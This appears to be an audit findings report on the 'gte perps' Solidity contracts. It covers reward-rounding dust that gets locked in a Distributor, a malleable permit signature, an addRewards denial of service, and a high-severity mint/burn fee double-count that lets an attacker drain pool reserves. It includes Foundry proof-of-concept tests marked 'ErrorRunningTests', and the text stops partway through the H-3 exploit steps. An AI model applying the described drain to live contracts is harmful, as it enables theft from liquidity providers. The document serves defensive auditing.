# 2025 08 gte perps - Findings Report
## Commit hash: f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7

##Findings by Pattern


 **Derived From** : Reward rounding can strand tokens and desync totalPendingRewards from actually claimable rewards

[M-1]. Rewards rounding vs totalPendingRewards lets dust rewards accumulate into permanently locked, unskimmable balances
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 6
Privilege: Permissionless
[L-2]. Integer rounding in accRewardPerShare leaves residual dust that cannot be claimed or skimmed, inflating totalPendingRewards
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 5
Privilege: Permissionless



 **Derived From** : Launchpad fee accounting lets LPs steal from pool via mint/burn desync

[H-3]. Launchpad fees counted as LP deposits let attackers steal pool reserves via mint/burn + fee distribution
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 7
Privilege: Permissionless



 **Derived From** : UniswapV2 LP token permit() missing low‑s and v validation (signature malleability)

[L-4]. UniswapV2ERC20.permit accepts malleable signatures (no low-s or strict v checks), enabling signature malleability
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: There is slight ambiguity about whether upstream library code is considered in-scope; however, the implementation is used directly by an in-scope contract. The technical claim is correct, but impact is limited, so marking as valid with low severity.
Finding Complexity: 2
Privilege: Permissionless



 **Derived From** : Rounding in rewards index vs totalPendingRewards can lock undistributable rewards

[L-5]. RewardsTrackerLib.update can zero out small pending rewards while Distributor.totalPendingRewards still counts them, permanently locking tokens
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 5
Privilege: Permissionless



 **Derived From** : Mismatched quote token in addRewards lets anyone brick reward pool accounting

[M-6]. Permissionless addRewards accepts arbitrary quote token, causing reward-pool-wide DoS via totalPendingRewards underflow
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 5
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 1
- M: 2
- L: 3
- I: 0

##Findings by Pattern


 **Derived From** : Reward rounding can strand tokens and desync totalPendingRewards from actually claimable rewards

## [M-1]. Rewards rounding vs totalPendingRewards lets dust rewards accumulate into permanently locked, unskimmable balances

### Finding Severity Justification: Rounding and zero-delta updates in RewardsTrackerLib.update() can permanently strand deposited reward tokens: addRewards increases totalPendingRewards by the full deposit, but integer division in accRewardPerShare updates discards remainders and even entire small deposits (delta == 0) while zeroing pending. Since totalPendingRewards is only decreased on actual payouts, the contract accrues liabilities that are never payable and thus become unskimmable. This leads to persistent loss of distributable rewards (matured yield) for users and locked funds for the protocol. While no direct theft occurs, the impact is sustained reward loss and balance-sheet desync, which is more than dust and can be repeatedly griefed.
## Derived From Pattern/Invariant
Reward rounding can strand tokens and desync totalPendingRewards from actually claimable rewards

## Exploit Type
AccountingInvariantViolation

## Location
Distributor.addRewards / claimRewards

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
Distributor tracks global reward liabilities per token using totalPendingRewards[asset], which is increased by the full deposited amount in addRewards and decreased only when actual payouts occur in _distributeAssets. Internally, RewardsTrackerLib distributes deposits to stakers via an accRewardPerShare index with fixed PRECISION_FACTOR = 1e12 and integer division.

Key paths:

- On reward deposit:
    function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
        ...
        if (launchAssetAmount > 0) {
            rs.addBaseRewards(launchAsset, launchAssetAmount);
            _increaseTotalPending(launchAsset, launchAssetAmount);
        }
        if (quoteAssetAmount > 0) {
            rs.addQuoteRewards(launchAsset, quoteAsset, quoteAssetAmount);
            _increaseTotalPending(quoteAsset, quoteAssetAmount);
        }
    }

- Index update and rounding:
    uint128 public constant PRECISION_FACTOR = 1e12;

    function totalAccRewards(uint256 shares, uint256 accRewardsPerShare) internal pure returns (uint256) {
        return (shares * accRewardsPerShare) / PRECISION_FACTOR;
    }

    function update(RewardPoolData storage self)
        internal
        returns (uint256 newAccBaseRewardsPerShare, uint256 newAccQuoteRewardsPerShare)
    {
        (newAccBaseRewardsPerShare, newAccQuoteRewardsPerShare) = getAccRewardsPerShare(self);
        if (self.pendingBaseRewards > 0) {
            self.accBaseRewardPerShare = newAccBaseRewardsPerShare;
            delete self.pendingBaseRewards;
        }
        if (self.pendingQuoteRewards > 0) {
            self.accQuoteRewardPerShare = newAccQuoteRewardsPerShare;
            delete self.pendingQuoteRewards;
        }
    }

    function getAccRewardsPerShare(RewardPoolData storage self)
        internal
        view
        returns (uint256 accBaseRewardsPerShare, uint256 accQuoteRewardsPerShare)
    {
        uint96 totalShares = self.totalShares;
        if (totalShares == 0) return (self.accBaseRewardPerShare, self.accQuoteRewardPerShare);
        accBaseRewardsPerShare = self.accBaseRewardPerShare;
        if (self.pendingBaseRewards > 0) {
            accBaseRewardsPerShare += ((self.pendingBaseRewards * PRECISION_FACTOR) / uint128(totalShares));
        }
        ...
    }

When update is called, it computes an increment

    delta = (pendingRewards * PRECISION_FACTOR) / totalShares

and applies it to acc*RewardPerShare, then unconditionally sets pending*Rewards to zero. Because of integer division, in general we have

    sum of all future payouts from this deposit <= pendingRewards

with a difference that can be as large as totalShares / PRECISION_FACTOR per deposit.

Two important edge cases arise:

1) Zero-delta deposits: if pendingRewards * PRECISION_FACTOR / totalShares < 1, the per-share increment is 0, acc*RewardPerShare is unchanged, and pending*Rewards is still deleted. That entire deposit is never reflected in any user's rewards at all.

2) General rounding: even when delta > 0, the product shares * accRewardsPerShare / PRECISION_FACTOR for all users sums to at most pendingRewards minus an integer remainder that is not tracked anywhere.

In both cases, Distributor.totalPendingRewards[asset] was increased by the *full* deposit amount when addRewards ran, but that full amount is never fully paid out through _distributeAssets, because RewardsTrackerLib has effectively thrown away the remainder.

Payout path:

    function _distributeAssets(address base, uint256 baseAmount, address quote, uint256 quoteAmount) internal {
        if (baseAmount > 0) {
            _decreaseTotalPending(base, baseAmount);
            base.safeTransfer(msg.sender, baseAmount);
        }
        if (quoteAmount > 0) {
            _decreaseTotalPending(quote, quoteAmount);
            quote.safeTransfer(msg.sender, quoteAmount);
        }
    }

    function _decreaseTotalPending(address asset, uint256 amount) internal {
        uint256 currTotal = totalPendingRewards[asset];
        if (currTotal < amount) revert ClaimAmountExceedsTotalPendingRewards();
        totalPendingRewards[asset] -= amount;
    }

Because _decreaseTotalPending is called only for actual paid amounts, these rounding losses accumulate as a monotonic drift between totalPendingRewards[asset] and the maximum sum of all rewards that can ever be paid to users. The stranded tokens remain in the Distributor's balance but are never reachable via claimRewards or stake/unstake flows, nor are they withdrawable by the owner:

    function skimExcessRewards(address asset, uint256 amount) external onlyOwnerOrRoles(ADMIN_ROLE) {
        if (amount > asset.balanceOf(address(this)) - totalPendingRewards[asset]) revert SkimOverflow();
        asset.safeTransfer(msg.sender, amount);
    }

Once the last staker exits (totalShares becomes zero), any remaining rounding dust from prior deposits is fully unclaimable:
- claimRewards reverts with ZeroShareClaim for everyone.
- totalPendingRewards[asset] still includes the lost dust.
- balanceOf(this) - totalPendingRewards[asset] is zero for that dust component, so skimExcessRewards cannot withdraw it.

An attacker cannot steal these funds, but they (and the protocol's own AMM fee rewards) can become permanently locked due to normal operation, breaking the intended invariant that totalPendingRewards tracks claimable rewards and that balance - totalPendingRewards is safely skimmable.

## Impact
Over time, a portion of legitimately deposited rewards (both user donations and AMM fee incentives) will never be paid out to stakers but will continue to be counted in totalPendingRewards. These tokens become permanently locked in the Distributor: they cannot be claimed by users (no pending rewards), and the owner cannot withdraw them via skimExcessRewards because they are still treated as liabilities. This violates the core accounting invariant between contract balances, totalPendingRewards, and actually claimable rewards, and can accumulate to a non-trivial amount across many pools and deposits.

## Command to Run Test


## Proof of Concept
The following test constructs a pool with a very large totalShares and then adds a minimal quote reward such that pendingRewards * PRECISION_FACTOR / totalShares == 0. When the first claim runs, RewardsTrackerLib.update() deletes pendingQuoteRewards without increasing accQuoteRewardPerShare, so no user ever receives the deposit even though totalPendingRewards and the contract's balance track it. Finally, skimExcessRewards is shown to revert when trying to withdraw this stranded dust.

1. Deploy Distributor and set launchpad.
2. As launchpad, create a rewards pair (base, quote).
3. As launchpad, call increaseStake(base, staker, 2 * PRECISION_FACTOR) to set totalShares to 2 * 1e12.
4. Donor adds exactly 1 unit of quote rewards via addRewards(base, quote, 0, 1).
   - This increments rs.pendingQuoteRewards by 1 and totalPendingRewards[quote] by 1.
5. staker calls claimRewards(base):
   - RewardsTrackerLib.update computes delta = (1 * 1e12) / (2 * 1e12) = 0, sets pendingQuoteRewards to 0, and leaves accQuoteRewardPerShare unchanged.
   - quoteAmount returned from rs.claim is 0, so no rewards are paid and no call is made to _decreaseTotalPending for quote.
6. Contract state now shows quote.balanceOf(Distributor) == 1 and totalPendingRewards[quote] == 1, but getPendingRewards(base, staker) returns (0, 0).
7. When the owner calls skimExcessRewards(quote, 1), the check amount <= balanceOf(this) - totalPendingRewards[quote] fails (1 > 1 - 1), causing SkimOverflow and demonstrating that this token is both unclaimable and unskimmable.

## Proof of Code
pragma solidity 0.8.27;
import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";
import {RewardsTrackerLib} from "contracts/launchpad/libraries/RewardsTracker.sol";

contract ERC20Mock {
    string public name = "Mock";
    string public symbol = "MOCK";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) {
            require(allowed >= amount, "allow");
            allowance[from][msg.sender] = allowed - amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract RoundingDustTest is Test {
    Distributor dist;
    ERC20Mock base;
    ERC20Mock quote;

    address launchpad = address(this);
    address staker = address(0xBEEF);
    address donor = address(0xD0);

    function setUp() public {
        dist = new Distributor();
        dist.initialize(launchpad);

        base = new ERC20Mock();
        quote = new ERC20Mock();

        // Create rewards pair as launchpad
        dist.createRewardsPair(address(base), address(quote));

        // Set totalShares to a large value so that a unit reward rounds to zero in the index
        // PRECISION_FACTOR is a constant (uint128) in the RewardsTrackerLib; cast to uint96 for shares
        uint96 shares = 2 * uint96(RewardsTrackerLib.PRECISION_FACTOR);
        dist.increaseStake(address(base), staker, shares);
    }

    function testRewardDustLockedAndUnskimmable() public {
        // Donor adds a tiny reward that is too small to change accQuoteRewardPerShare
        quote.mint(donor, 1);
        vm.startPrank(donor);
        quote.approve(address(dist), type(uint256).max);
        dist.addRewards(address(base), address(quote), 0, 1);
        vm.stopPrank();

        // First claim wipes pendingQuoteRewards via update() but pays nothing
        vm.startPrank(staker);
        dist.claimRewards(address(base));
        vm.stopPrank();

        // One quote token is now stuck: counted as pending liability but not claimable
        assertEq(quote.balanceOf(address(dist)), 1);
        assertEq(dist.totalPendingRewards(address(quote)), 1);
        (uint256 pBase, uint256 pQuote) = dist.getPendingRewards(address(base), staker);
        assertEq(pBase, 0);
        assertEq(pQuote, 0);

        // Owner cannot skim it either because it's still counted as a liability
        vm.expectRevert(Distributor.SkimOverflow.selector);
        dist.skimExcessRewards(address(quote), 1);
    }
}


## Suggested Mitigation
Ensure totalPendingRewards tracks only amounts that can actually be distributed under the accRewardPerShare model, and make any non-distributable remainder explicitly skimmable. Robust approaches:
- Realize-and-account method: In addRewards(), immediately call rs.update() to realize currently pending rewards into acc per share, then compute the newly distributable amount for this deposit: delta = floor((pending_new * PRECISION) / totalShares); distributed = floor((delta * totalShares) / PRECISION). Increase totalPendingRewards by distributed only, not by the raw deposit. Keep the leftover remainder in rs.pending* so it can accrue and become distributable later. This guarantees totalPendingRewards never exceeds the sum of all future payouts.
- Remainder tracking in update(): Modify RewardsTrackerLib.update() to compute distributed as above and reduce pending by distributed instead of deleting it. Track unaccountedDust[asset] = rawDeposits - cumulativeDistributed, and subtract this dust from the SkimOverflow check: allow owner to skim unaccountedDust safely. This preserves liabilities only for distributable rewards while making rounding dust recoverable.
- Minimum-deposit guard: While totalShares > 0, revert addRewards if amount * PRECISION_FACTOR / totalShares == 0. Optionally combine with a donations bucket: deposits failing the guard are sent to donations[asset] and are skimmable.
Any of the above fully eliminates permanently locked dust by aligning liabilities with provably claimable rewards or by explicitly classifying rounding dust as skimmable.


## [L-2]. Integer rounding in accRewardPerShare leaves residual dust that cannot be claimed or skimmed, inflating totalPendingRewards

### Finding Severity Justification: The issue strands small rounding remainders inside Distributor and desynchronizes totalPendingRewards from actually claimable user rewards. No user funds can be stolen and there is no denial of service to core protocol operations. Impact is limited to dust-sized tokens becoming unclaimable and unskimmable; per update the lost amount is bounded (on the order of at most a few smallest units per user), which fits Code4rena's dust/rounding category.
## Derived From Pattern/Invariant
Reward rounding can strand tokens and desync totalPendingRewards from actually claimable rewards

## Exploit Type
AccountingInvariantViolation

## Location
Distributor.claimRewards

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
Beyond the zero-delta case, the MasterChef-style reward index used by RewardsTrackerLib introduces rounding remainders on every distribution. These remainders are not tracked anywhere, but Distributor.totalPendingRewards is debited only by the amounts actually paid out. This again breaks the invariant that totalPendingRewards equals the sum of future payouts, and it can leave non-trivial amounts of tokens permanently stuck.

The relevant pieces:

Distributor.addRewards and _distributeAssets:

```solidity
mapping(address => uint256) public totalPendingRewards;

function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
    ...
    if (launchAssetAmount > 0) {
        rs.addBaseRewards(launchAsset, launchAssetAmount);
        _increaseTotalPending(launchAsset, launchAssetAmount);
        launchAsset.safeTransferFrom(msg.sender, address(this), uint256(launchAssetAmount));
    }
    if (quoteAssetAmount > 0) {
        rs.addQuoteRewards(launchAsset, quoteAsset, quoteAssetAmount);
        _increaseTotalPending(quoteAsset, quoteAssetAmount);
        quoteAsset.safeTransferFrom(msg.sender, address(this), uint256(quoteAssetAmount));
    }
}

function _distributeAssets(address base, uint256 baseAmount, address quote, uint256 quoteAmount) internal {
    if (baseAmount > 0) {
        _decreaseTotalPending(base, baseAmount);
        base.safeTransfer(msg.sender, baseAmount);
    }
    if (quoteAmount > 0) {
        _decreaseTotalPending(quote, quoteAmount);
        quote.safeTransfer(msg.sender, quoteAmount);
    }
}
```

RewardsTrackerLib reward math:

```solidity
uint128 public constant PRECISION_FACTOR = 1e12;

function totalAccRewards(uint256 shares, uint256 accRewardsPerShare) internal pure returns (uint256) {
    return (shares * accRewardsPerShare) / PRECISION_FACTOR;
}

function update(RewardPoolData storage self)
    internal
    returns (uint256 newAccBaseRewardsPerShare, uint256 newAccQuoteRewardsPerShare)
{
    (newAccBaseRewardsPerShare, newAccQuoteRewardsPerShare) = getAccRewardsPerShare(self);

    if (self.pendingBaseRewards > 0) {
        self.accBaseRewardPerShare = newAccBaseRewardsPerShare;
        delete self.pendingBaseRewards;
    }

    if (self.pendingQuoteRewards > 0) {
        self.accQuoteRewardPerShare = newAccQuoteRewardsPerShare;
        delete self.pendingQuoteRewards;
    }
}

function getAccRewardsPerShare(RewardPoolData storage self)
    internal
    view
    returns (uint256 accBaseRewardsPerShare, uint256 accQuoteRewardsPerShare)
{
    uint96 totalShares = self.totalShares;
    if (totalShares == 0) return (self.accBaseRewardPerShare, self.accQuoteRewardPerShare);

    accBaseRewardsPerShare = self.accBaseRewardPerShare;
    accQuoteRewardsPerShare = self.accQuoteRewardPerShare;

    if (self.pendingBaseRewards > 0) {
        accBaseRewardsPerShare += ((self.pendingBaseRewards * PRECISION_FACTOR) / uint128(totalShares));
    }
    if (self.pendingQuoteRewards > 0) {
        accQuoteRewardsPerShare += ((self.pendingQuoteRewards * PRECISION_FACTOR) / uint128(totalShares));
    }
}
```

When pendingBaseRewards > 0 and totalShares > 0, getAccRewardsPerShare adds:

    deltaAcc = floor(pendingBaseRewards * PRECISION_FACTOR / totalShares)

to accBaseRewardPerShare and update() then deletes pendingBaseRewards. Each user’s reward increment is:

    deltaReward_i = floor(shares_i * deltaAcc / PRECISION_FACTOR)

The sum over all users is strictly less than or equal to pendingBaseRewards, with a remainder from double rounding in general. That remainder is:
- Not left in pendingBaseRewards (it was deleted),
- Not reflected in accBaseRewardPerShare, and
- Therefore never paid out via stake/unstake/claim.

However, Distributor.totalPendingRewards[asset] was increased by the full pendingBaseRewards amount at addRewards time and is only decreased by the baseAmount actually paid out via _distributeAssets. Hence, after all users have fully claimed and even exited the pool (totalShares == 0), it is possible to have:
- totalPendingRewards[asset] > 0,
- asset.balanceOf(Distributor) >= totalPendingRewards[asset],
- No user with any pending rewards or shares (further claimRewards will revert with ZeroShareClaim), and
- balanceOf - totalPendingRewards == 0 so skimExcessRewards cannot withdraw the dust.

Over many reward additions and user actions, these rounding remainders can accumulate beyond trivial dust, leading to a growing pool of stranded tokens that neither users nor admin can access.

## Impact
The invariant break is larger than mere dust. Because update() deletes pending*Rewards after a truncated acc-per-share bump, users only receive floor-based amounts. If a small reward is added relative to totalShares (e.g., 2 tokens with 3 total shares), each user’s claim rounds to 0 and the entire reward tranche can remain unpaid. If users then exit (totalShares becomes 0), the unpaid remainder is unclaimable and cannot be skimmed because totalPendingRewards still includes it. Repeated small additions followed by pool exit can strand non-trivial sums, reducing fee capture and leaving the contract with permanently locked tokens. No theft occurs, but funds become inaccessible without an upgrade.

## Command to Run Test


## Proof of Concept
1. Deploy Distributor and initialize launchpad = address(this).
2. Create a rewards pair (launchAsset, quoteAsset) from launchpad.
3. From launchpad, give three users (alice, bob, carol) one share each via increaseStake, so totalShares == 3.
4. An attacker (or the launchpad fee mechanism) deposits a reward amount that is not perfectly divisible in the fixed-point representation. For example, set rewardAmount = 1e12 and call addRewards(launchAsset, quoteAsset, rewardAmount, 0). This increases pendingBaseRewards and totalPendingRewards[launchAsset] by rewardAmount and transfers tokens into Distributor.
5. Each of alice, bob, and carol calls claimRewards(launchAsset) once. The first claim triggers update(), which moves pendingBaseRewards into accBaseRewardPerShare using integer division. Each user then receives baseAmount_i = floor(shares_i * deltaAcc / PRECISION_FACTOR) > 0.
6. The total distributed across the three users is strictly less than rewardAmount (e.g. rewardAmount - 1 due to rounding), so Distributor.totalPendingRewards[launchAsset] is reduced by only the amounts actually paid out.
7. Launchpad (as the onlyLaunchpad caller) then calls decreaseStake to fully remove all shares from alice, bob, and carol. After this, totalShares == 0 and no user has any remaining pending rewards.
8. At this point:
   - launchAsset.balanceOf(Distributor) > 0, representing the rounding dust.
   - totalPendingRewards[launchAsset] > 0, equal to that dust.
   - balanceOf - totalPendingRewards == 0, so any attempt to skimExcessRewards(launchAsset, 1) reverts with SkimOverflow().
   - No user has shares, so claimRewards cannot be used to withdraw the dust (ZeroShareClaim will revert).
9. The dust tokens are now permanently stuck in the Distributor contract.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "../contracts/launchpad/Distributor.sol";

contract MockERC20 {
    string public name = "Mock";
    string public symbol = "MOCK";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount);
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount);
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount);
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract DistributorRoundingDustTest is Test {
    Distributor distributor;
    MockERC20 launchAsset;
    MockERC20 quoteAsset;
    address launchpad = address(this);
    address alice = address(0xA11CE);
    address bob   = address(0xB0B);
    address carol = address(0xCAFE);
    address attacker = address(0xDEAD);

    function setUp() public {
        distributor = new Distributor();
        distributor.initialize(launchpad);

        launchAsset = new MockERC20();
        quoteAsset = new MockERC20();

        vm.prank(launchpad);
        distributor.createRewardsPair(address(launchAsset), address(quoteAsset));

        // 3 users, 1 share each => totalShares = 3
        vm.prank(launchpad);
        distributor.increaseStake(address(launchAsset), alice, 1);
        vm.prank(launchpad);
        distributor.increaseStake(address(launchAsset), bob, 1);
        vm.prank(launchpad);
        distributor.increaseStake(address(launchAsset), carol, 1);
    }

    function testRoundingLeavesUnclaimableDust() public {
        // Deposit a reward amount that cannot be perfectly split across 3 shares
        // in the fixed-point representation, creating rounding dust.
        uint256 rewardAmount = 1e12;
        launchAsset.mint(attacker, rewardAmount);
        vm.prank(attacker);
        launchAsset.approve(address(distributor), rewardAmount);

        vm.prank(attacker);
        distributor.addRewards(address(launchAsset), address(quoteAsset), uint128(rewardAmount), 0);

        // Each user claims once to realize their pro-rata share.
        vm.prank(alice);
        distributor.claimRewards(address(launchAsset));
        vm.prank(bob);
        distributor.claimRewards(address(launchAsset));
        vm.prank(carol);
        distributor.claimRewards(address(launchAsset));

        // Launchpad removes all shares (users exit the pool).
        vm.prank(launchpad);
        distributor.decreaseStake(address(launchAsset), alice, 1);
        vm.prank(launchpad);
        distributor.decreaseStake(address(launchAsset), bob, 1);
        vm.prank(launchpad);
        distributor.decreaseStake(address(launchAsset), carol, 1);

        // No user has any pending rewards.
        (uint256 pa0, uint256 pq0) = distributor.getPendingRewards(address(launchAsset), alice);
        (uint256 pa1, uint256 pq1) = distributor.getPendingRewards(address(launchAsset), bob);
        (uint256 pa2, uint256 pq2) = distributor.getPendingRewards(address(launchAsset), carol);
        assertEq(pa0 + pq0 + pa1 + pq1 + pa2 + pq2, 0);

        // But there is still a non-zero launchAsset balance counted as totalPendingRewards.
        uint256 bal = launchAsset.balanceOf(address(distributor));
        uint256 pending = distributor.totalPendingRewards(address(launchAsset));
        assertGt(pending, 0);
        assertEq(bal - pending, 0);

        // Owner cannot skim this residual dust.
        vm.expectRevert(Distributor.SkimOverflow.selector);
        distributor.skimExcessRewards(address(launchAsset), 1);
    }
}


## Suggested Mitigation
Align reward accounting with truncation and provide a safe release path when there are no shares: 1) In RewardsTrackerLib.update(), carry forward rounding remainders instead of deleting all pending: compute deltaAcc = (pending * PRECISION_FACTOR) / totalShares; distributed = (deltaAcc * totalShares) / PRECISION_FACTOR; then self.acc* += deltaAcc and self.pending* -= distributed. This lets future updates aggregate leftovers until they become payable. 2) Add an admin-only finalize path in Distributor to release residual pending when there are no shares, e.g., releaseRemainder(launchAsset): require rs.totalShares == 0; read rs.pendingBaseRewards and rs.pendingQuoteRewards, set them to 0, and decrease totalPendingRewards by these amounts. After that, the owner can safely skim. This preserves the invariant that totalPendingRewards equals the maximum claimable amount while ensuring no permanent lock-in when a pool has ended.





 **Derived From** : Launchpad fee accounting lets LPs steal from pool via mint/burn desync

## [H-3]. Launchpad fees counted as LP deposits let attackers steal pool reserves via mint/burn + fee distribution

### Finding Severity Justification: Accrued launchpad fees are excluded from reserves but included in mint/burn calculations, allowing a permissionless attacker to mint LP shares by counting already-accrued fee tokens as their own deposit and later redeem a pro‑rata claim on the pool while those same fees are also transferred to the Distributor. This creates a double-spend of the fee balance and directly drains pool reserves (real asset loss) without any privileged access.
## Derived From Pattern/Invariant
Launchpad fee accounting lets LPs steal from pool via mint/burn desync

## Exploit Type
AccountingInvariantViolation

## Location
GTELaunchpadV2Pair.mint

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 7
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
GTELaunchpadV2Pair tracks launchpad fees in separate buckets `accruedLaunchpadFee0/1` and subtracts them from balances when updating reserves, but `mint` and `burn` use inconsistent bases for liquidity and payout calculations. This allows an attacker to treat already-accrued launchpad fees as if they were their own liquidity deposit, then still have those same fees later distributed to the Distributor, effectively debiting the pool reserves twice.

Key code paths:

1) `_update` stores reserves net of launchpad fees:
```solidity
function _update(
    uint256 balance0,
    uint256 balance1,
    uint112 _reserve0,
    uint112 _reserve1,
    uint112 newLaunchpadFee0,
    uint112 newLaunchpadFee1
) private {
    uint112 totalLaunchpadFee0 = accruedLaunchpadFee0 + newLaunchpadFee0;
    uint112 totalLaunchpadFee1 = accruedLaunchpadFee1 + newLaunchpadFee1;
    ...
    if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {
        ...
        if (launchpadFeeDistributor > address(0)) {
            if (totalLaunchpadFee0 | totalLaunchpadFee1 > 0) {
                delete accruedLaunchpadFee0;
                delete accruedLaunchpadFee1;
                _distributeLaunchpadFees(totalLaunchpadFee0, totalLaunchpadFee1);
            }
        }
    } else if (launchpadFeeDistributor > address(0) && newLaunchpadFee0 | newLaunchpadFee1 > 0) {
        accruedLaunchpadFee0 = totalLaunchpadFee0;
        accruedLaunchpadFee1 = totalLaunchpadFee1;
        emit LaunchpadFeesAccrued(newLaunchpadFee0, newLaunchpadFee1);
    }

    // Balances contain both accrued and new launchpad fees
    reserve0 = _reserve0 = uint112(balance0) - totalLaunchpadFee0;
    reserve1 = _reserve1 = uint112(balance1) - totalLaunchpadFee1;
}
```
Here, `reserve0/1` represent AMM reserves excluding any (possibly accumulated) launchpad fee balances. The actual on-chain balances satisfy `balanceX = reserveX + accruedLaunchpadFeeX` (ignoring donations).

2) `swap` can accrue new launchpad fees into `accruedLaunchpadFee0/1` **without distributing them** when `timeElapsed == 0` (second and later `_update` calls in a block):
```solidity
(uint112 launchpadFee0, uint112 launchpadFee1) =
    launchpadFeeDistributor > address(0) && rewardsPoolActive > 0
        ? _getLaunchpadFees(amount0In, amount1In)
        : (uint112(0), uint112(0));

_update(balance0, balance1, _reserve0, _reserve1, launchpadFee0, launchpadFee1);
```
When the `swap`'s `_update` sees `timeElapsed == 0`, it executes the `else if` branch and stores the new fees into `accruedLaunchpadFeeX`. The fee tokens remain inside the pair's balances but are **excluded** from reserves.

3) `mint` computes deposit amounts as `balance - reserve`, which *includes* any already-accrued launchpad fees:
```solidity
function mint(address to) external lock returns (uint256 liquidity) {
    (uint112 _reserve0, uint112 _reserve1,) = getReserves();
    uint256 balance0 = IERC20(token0).balanceOf(address(this));
    uint256 balance1 = IERC20(token1).balanceOf(address(this));
    uint256 amount0 = balance0.sub(_reserve0);
    uint256 amount1 = balance1.sub(_reserve1);
    ...
    liquidity = Math.min(
        amount0.mul(_totalSupply) / _reserve0,
        amount1.mul(_totalSupply) / _reserve1
    );
    ...
    _mint(to, liquidity);
    _update(balance0, balance1, _reserve0, _reserve1, uint112(0), uint112(0));
}
```
If `accruedLaunchpadFee0 > 0` from a previous `_update`, then
`amount0 = balance0 - _reserve0 = userDeposit0 + accruedLaunchpadFee0`. A user who deposits *only token1* still gets credit as if they deposited `accruedLaunchpadFee0` units of token0.

4) `burn` pays out pro-rata based on the full balances, including any fee tokens:
```solidity
function burn(address to) external lock returns (uint256 amount0, uint256 amount1) {
    (uint112 _reserve0, uint112 _reserve1,) = getReserves();
    ...
    uint256 balance0 = IERC20(_token0).balanceOf(address(this));
    uint256 balance1 = IERC20(_token1).balanceOf(address(this));
    uint256 liquidity = balanceOf[address(this)];

    amount0 = liquidity.mul(balance0) / _totalSupply; // uses full balances
    amount1 = liquidity.mul(balance1) / _totalSupply;
    ...
    _safeTransfer(_token0, to, amount0);
    _safeTransfer(_token1, to, amount1);
    balance0 = IERC20(_token0).balanceOf(address(this));
    balance1 = IERC20(_token1).balanceOf(address(this));

    _update(balance0, balance1, _reserve0, _reserve1, uint112(0), uint112(0));
}
```
When `burn` runs in a later block, `balance0` still includes whatever portion of the launchpad fee tokens remain in the pair. The attacker thus redeems a share of fee tokens **once** via `burn`.

5) When `_update` is called in a later block (with `timeElapsed > 0`), it uses the stale `accruedLaunchpadFeeX` value (which still reflects the **original** fees before the attacker’s burn), deletes `accruedLaunchpadFeeX`, and calls `_distributeLaunchpadFees(totalLaunchpadFeeX)`. Since the pair's total token0 balance is still large enough, the transfer of `totalLaunchpadFee0` to the Distributor succeeds — but part of that amount has already been paid out to the attacker through `burn`, so the remainder is taken from the actual AMM reserves.

Net effect:
- The attacker injects only token1, but `mint` counts the existing `accruedLaunchpadFee0` as if it were their token0 deposit, giving them LP shares backed by reserves plus fee tokens.
- On `burn`, they withdraw a pro-rata share of both reserves and the fee tokens.
- Later, `_distributeLaunchpadFees` still sends the full `accruedLaunchpadFee` to the Distributor, funded out of the remaining pool tokens (including honest LPs’ reserves).

This double-spends the launchpad fee balance: the same fee amount is partially paid to the attacker and fully paid to the Distributor, with the shortfall coming from the pool reserves. Over time an attacker can repeat this pattern whenever `accruedLaunchpadFeeX` is positive, draining value from other LPs and from the launchpad LP. This is a direct violation of the implicit accounting invariant that `accruedLaunchpadFee{0,1}` should always match extra tokens on top of the reserves.

## Impact
An unprivileged attacker can repeatedly extract a roughly launchpad-fee-sized amount of tokens from the pool per cycle by treating accrued launchpad fees as deposits, then also forcing these same fees to be distributed to the Distributor. This steals reserves from honest LPs (and from the launchpad LP) while the Distributor still receives its full fee share, causing a gradual but unbounded drain of the pool’s assets.

## Command to Run Test


## Proof of Concept
Revised high-level exploit:
1) Preconditions: Pair has liquidity; launchpadFeeDistributor is set; rewardsPoolActive > 0.
2) Block t: Attacker (or anyone) calls sync() so blockTimestampLast becomes the current block’s timestamp.
